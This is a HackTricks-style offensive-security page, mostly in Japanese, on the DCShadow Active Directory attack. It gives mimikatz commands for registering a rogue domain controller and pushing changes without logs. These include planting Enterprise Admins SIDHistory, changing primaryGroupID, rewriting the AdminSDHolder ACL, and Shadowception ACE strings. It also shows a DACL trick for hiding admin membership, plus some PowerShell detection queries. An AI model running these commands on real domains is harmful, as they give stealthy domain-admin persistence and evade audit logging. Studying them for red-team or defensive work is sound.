# DCShadow

{{#include ../../banners/hacktricks-training.md}}


## 基本情報

AD に**新しい Domain Controller**を登録し、それを使用して、指定したオブジェクトに対して **attributes**（SIDHistory、SPNs など）を **push**します。この際、**modifications**に関する**ログ**を一切残しません。**DA**権限が必要で、**root domain**内にいる必要があります。\
誤ったデータを使用すると、非常に見苦しいログが表示されることに注意してください。<sup>[[2]](#references)</sup>

この攻撃を実行するには、2つの mimikatz instances が必要です。1つは SYSTEM 権限で RPC servers を起動し（ここで実行したい変更を指定します）、もう1つの instance は値を push するために使用します。
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
`mimikatz1` session では **`elevate::token`** は機能しないことに注意してください。これは thread の privileges を昇格させますが、必要なのは **process の privilege** の昇格です。\
"LDAP" object を選択することもできます: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

DA または次の最小限の permissions を持つ user から変更を push できます:

- **domain object**:
- _DS-Install-Replica_ (Add/Remove Replica in Domain)
- _DS-Replication-Manage-Topology_ (Manage Replication Topology)
- _DS-Replication-Synchronize_ (Replication Synchornization)
- **Configuration container** 内の **Sites object**（およびその children）:
- _CreateChild and DeleteChild_
- DC として登録されている **computer の object**:
- _WriteProperty_ (Not Write)
- **target object**:
- _WriteProperty_ (Not Write)

[**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) を使用して、これらの privileges を unprivileged user に付与できます（これによりいくつかの logs が残ることに注意してください）。これは DA privileges よりも大幅に restrictive です。\
例: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` これは、machine _**mcorp-student1**_ に log on している username _**student1**_ が、object _**root1user**_ に対する DCShadow permissions を持つことを意味します。

## DCShadow を使用した backdoors の作成
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Chage PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
### Primary group の悪用、列挙の抜け、検知

- `primaryGroupID` は、グループの `member` リストとは別の属性です。DCShadow/DSInternals はこれを直接書き込めます（例: **Domain Admins** に対して `primaryGroupID=512` を設定）。オンボックスの LSASS による強制はありませんが、AD はユーザーを **移動** させます。PGID を変更すると、常に以前の primary group からメンバーシップが削除されます（対象グループがどれであっても同じ動作です）。そのため、以前の primary-group メンバーシップを維持することはできません。<sup>[[1]](#references)</sup>
- デフォルトのツールでは、ユーザーを現在の primary group から削除できません（`ADUC`、`Remove-ADGroupMember`）。そのため、PGID の変更には通常、直接の directory writes（DCShadow/`Set-ADDBPrimaryGroup`）が必要です。
- メンバーシップのレポート結果には一貫性がありません。
- **primary-group に由来するメンバーを含む**: `Get-ADGroupMember "Domain Admins"`、`net group "Domain Admins"`、ADUC/Admin Center。
- **primary-group に由来するメンバーを省略する**: `Get-ADGroup "Domain Admins" -Properties member`、ADSI Edit で `member` を確認する場合、`Get-ADUser <user> -Properties memberOf`。
- **primary group 自体が nested の場合**、再帰的なチェックで primary-group メンバーが見落とされることがあります（例: user の PGID が、Domain Admins 内の nested group を指している場合）。`Get-ADGroupMember -Recursive` や LDAP recursive filters は、primary groups を明示的に解決しない限り、そのユーザーを返しません。
- DACL の手法: 攻撃者は、ユーザーの `primaryGroupID` に対する **ReadProperty を deny** する（または AdminSDHolder の保護対象ではないグループの `member` 属性に対して deny する）ことで、ほとんどの PowerShell クエリから有効なメンバーシップを隠せます。ただし、`net group` は引き続きメンバーシップを解決します。AdminSDHolder で保護されたグループでは、このような deny はリセットされます。

検知/monitoring の例:
```powershell
# Find users whose primary group is not the default Domain Users (RID 513)
Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
Where-Object { $_.primaryGroupID -ne 513 } |
Select-Object Name,SamAccountName,primaryGroupID,primaryGroup
```

```powershell
# Find users where primaryGroupID cannot be read (likely denied via DACL)
Get-ADUser -Filter * -Properties primaryGroupID |
Where-Object { -not $_.primaryGroupID } |
Select-Object Name,SamAccountName
```
`Get-ADGroupMember` の出力を `Get-ADGroup -Properties member` または ADSI Edit と比較して privileged groups を cross-check し、`primaryGroupID` や hidden attributes によって生じた差異を検出します。<sup>[[1]](#references)</sup>

## Shadowception - DCShadow を使用して DCShadow permissions を付与（modified permissions logs なし）

以下の ACEs にユーザーの SID を末尾で追加する必要があります：<sup>[[2]](#references)</sup>

- ドメインオブジェクト上：
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- attacker computer object 上：`(A;;WP;;;UserSID)`
- target user object 上：`(A;;WP;;;UserSID)`
- Configuration container 内の Sites object 上：`(A;CI;CCDC;;;UserSID)`

オブジェクトの現在の ACE を取得するには：`(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

この場合、1つだけではなく、**複数の変更を行う必要がある**ことに注意してください。そのため、**mimikatz1 session**（RPC server）では、行いたい各変更に対してパラメータ **`/stack`** を使用します。これにより、rouge server に stack されたすべての変更を実行するために **`/push`** を1回使用するだけで済みます。

[**ired.team の DCShadow に関する詳細情報。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

## References

- [1] [TrustedSec - Adventures in Primary Group Behavior, Reporting, and Exploitation](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
- [2] [DCShadow write-up in ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{{#include ../../banners/hacktricks-training.md}}
